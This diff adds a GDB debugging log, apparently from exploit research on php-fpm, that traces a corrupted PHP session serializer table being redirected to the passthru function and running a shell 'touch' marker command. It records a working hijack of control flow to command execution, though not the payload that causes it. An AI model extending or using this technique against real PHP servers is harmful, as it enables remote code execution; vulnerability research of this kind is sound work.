@@ -1,0 +1,67 @@
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+0x00007ffff689b3a7 in ?? () from /lib/x86_64-linux-gnu/libc.so.6
+warning: File "/tmp/opencode/realapps/install_realapps_np/sbin/php-fpm" auto-loading has been declined by your `auto-load safe-path' set to "$debugdir:$datadir/auto-load".
+To enable execution of this file add
+	add-auto-load-safe-path /tmp/opencode/realapps/install_realapps_np/sbin/php-fpm
+line to your configuration file "/home/davide/.config/gdb/gdbinit".
+To completely disable this security protection add
+	set auto-load safe-path /
+line to your configuration file "/home/davide/.config/gdb/gdbinit".
+For more information about this security protection see the
+"Auto-loading safe path" section in the GDB manual.  E.g., run from the shell:
+	info "(gdb)Auto-loading safe path"
+Breakpoint 1 at 0x9e68b5: file /home/davide/ailocal/php/zerodays_1020/build_plain/ext/session/session.c, line 290.
+Breakpoint 2 at 0xa3c074: file /home/davide/ailocal/php/zerodays_1020/build_plain/ext/standard/exec.c, line 257.
+Breakpoint 3 at 0xa3bdfd: file /home/davide/ailocal/php/zerodays_1020/build_plain/ext/standard/exec.c, line 201.
+Breakpoint 4 at 0xa3bbd7: file /home/davide/ailocal/php/zerodays_1020/build_plain/ext/standard/exec.c, line 113.
+Breakpoint 5 at 0xa3c047: file /home/davide/ailocal/php/zerodays_1020/build_plain/ext/standard/exec.c, line 221.
+DECODE hit=1 data=0x7ffff466a000 val=0x7ffff466a018 len=131014 level=1 bgdata=0x7ffff4681000 ser2decode=0x9e6dd5 ser2encode=0x9e6b15 pser=0x22c54d0
+0x22c54a0 <ps_serializers>:	0x0000000001018ce1	0x00000000009e2078
+0x22c54b0 <ps_serializers+16>:	0x00000000009e20de	0x0000000001019353
+0x22c54c0 <ps_serializers+32>:	0x00000000009e7112	0x00000000009e6fae
+0x22c54d0 <ps_serializers+48>:	0x0000000001018cef	0x00000000009e6b15
+0x22c54e0 <ps_serializers+64>:	0x00000000009e6dd5
+0x7ffff466a018:	0x4141414141414160	0x4141414141414141
+0x7ffff466a028:	0x4141414141414141	0x4141414141414141
+0x7ffff466a038:	0x4141414141414141	0x0000000141414141
+0x7ffff466a048:	0x4141414141414141	0x4141414141414141
+0x7ffff466a058:	0x4141414141414141	0x4141414141414141
+0x7ffff466a068:	0x00007ffff46ae190	0x4141414141414106
+0x7ffff4681000:	0x00007ffff4681038	0x00007ffff4684000
+0x7ffff4681010:	0x00007ffff4684000	0x0000000000000000
+0x7ffff4681020:	0x0000000000000000	0x0000000000000000
+0x7ffff4681030:	0x000000007fffffff	0x00000000000003fa
+0x7ffff4681040:	0x0000000000000000
+0x7ffff4684000:	0xfffff80000dc414d	0x0000000000000000
+0x7ffff4684010:	0x0000000000000000	0x0000000000000000
+DECODE hit=2 data=0x7ffff46ae000 val=0x7ffff46ae018 len=131313 level=1 bgdata=0x7ffff4681000 ser2decode=0xa3c074 ser2encode=0x9e6b15 pser=0x22c54d0
+0x22c54a0 <ps_serializers>:	0x0000000001018ce1	0x00000000009e2078
+0x22c54b0 <ps_serializers+16>:	0x00000000009e20de	0x0000000001019353
+0x22c54c0 <ps_serializers+32>:	0x00000000009e7112	0x00000000009e6fae
+0x22c54d0 <ps_serializers+48>:	0x0000000001018cef	0x00000000009e6b15
+0x22c54e0 <ps_serializers+64>:	0x0000000000a3c074
+VAL2 first 0x80:
+0x7ffff46ae018:	0x4141414141414160	0x4141414141414141
+0x7ffff46ae028:	0x4141414141414141	0x4141414141414141
+0x7ffff46ae038:	0x4141414141414141	0x0000000141414141
+0x7ffff46ae048:	0x4141414141414141	0x4141414141414141
+0x7ffff46ae058:	0x4141414141414141	0x4141414141414141
+0x7ffff46ae068:	0x00007ffff46ae190	0x4141414141414106
+0x7ffff46ae078:	0x31333730313a6941	0x3a737a013b363336
+0x7ffff46ae088:	0x223a323938303331	0x0000000000000000
+ZIF_PASSTHRU hit rdi=0x7ffff46ae018 rsi=0x200f1 rdx=0x3a632cc16ace3571
+0x7ffff46ae018:	0x4141414141414160	0x4141414141414141
+0x7ffff46ae028:	0x4141414141414141	0x4141414141414141
+0x7ffff46ae038:	0x4141414141414141	0x0000000141414141
+0x7ffff46ae048:	0x4141414141414141	0x4141414141414141
+0x7ffff46ae058:	0x4141414141414141	0x4141414141414141
+0x7ffff46ae068:	0x00007ffff46ae190	0x4141414141414106
+PHP_EXEC_EX rdi=0x7ffff46ae018 rsi=0x200f1 rdx=0x3 numargs=1 arg1val=0x7ffff46ae190 arg1type=6
+F=0x7ffff46ae190 F+0x10(len)=67
+0x7ffff46ae1a8:	"touch /tmp/opencode/research/realzif_20261022T013000Z/PASSTHRU_REAL"
+PHP_EXEC type=3 cmd=0x7ffff46ae1a8 array=(nil) retval=0x200f1
+0x7ffff46ae1a8:	"touch /tmp/opencode/research/realzif_20261022T013000Z/PASSTHRU_REAL"
+[Detaching after vfork from child process 142976]
+AFTER_PHP_EXEC eax=0
+[Inferior 1 (process 142370) detached]
